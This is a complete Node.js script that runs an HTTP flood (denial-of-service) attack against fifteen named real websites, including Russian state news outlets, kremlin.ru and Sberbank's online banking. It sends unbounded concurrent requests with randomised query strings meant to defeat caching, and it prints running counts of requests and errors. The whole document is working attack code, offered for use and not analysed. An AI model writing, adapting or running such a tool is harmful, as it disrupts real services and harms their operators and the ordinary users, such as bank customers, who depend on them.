
import fetch from "node-fetch";

const opts = { number_of_requests: 0, number_of_errored_responses: 0 };
const targets = {
  'https://lenta.ru/': {...opts},
  'https://ria.ru/': {...opts},
  'https://ria.ru/lenta/': {...opts},
  'https://www.rbc.ru/': {...opts},
  'https://www.rt.com/': {...opts},
  'http://kremlin.ru/': {...opts},
  'http://en.kremlin.ru/': {...opts},
  'https://smotrim.ru/': {...opts},
  'https://tass.ru/': {...opts},
  'https://tvzvezda.ru/': {...opts},
  'https://vsoloviev.ru/': {...opts},
  'https://www.1tv.ru/': {...opts},
  'https://www.vesti.ru/': {...opts},
  'https://online.sberbank.ru/': {...opts},
  'https://sberbank.ru/': {...opts},
}

const printStats = () => {
  process.stdout.write("\u001b[3J\u001b[2J\u001b[1J");
  console.log(targets);
}
setInterval(printStats, 1000);

const CONCURRENCY_LIMIT = 1000
const queue = []

async function fetchWithTimeout(resource, options) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), options.timeout);
  return fetch(resource, {
    signal: controller.signal
  }).then((response) => {
    clearTimeout(id);
    return response;
  }).catch((error) => {
    clearTimeout(id);
  });
}

const flood = async (target) => {
  for (let i = 0;; ++i) {
    if (queue.length > CONCURRENCY_LIMIT) {
      await queue.shift();
    }
    const rand = i % 13 === 0 ? '' : ('?' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15));
    queue.push(
      fetchWithTimeout(target+rand, { timeout: 2500 })
        .catch((error) => {
          console.log(error);
          if (error.code === 20 /* ABORT */) {
            return;
          }
          targets[target].number_of_errored_responses++;
          targets[target].error_message = error.message;
        })
        .then((response) => {
          if (response && !response.ok) {
            targets[target].number_of_errored_responses++;
            targets[target].error_message = response.statusText;
          }
          targets[target].number_of_requests++;
        })
    )
  }
}

// Start
Object.keys(targets).map(flood);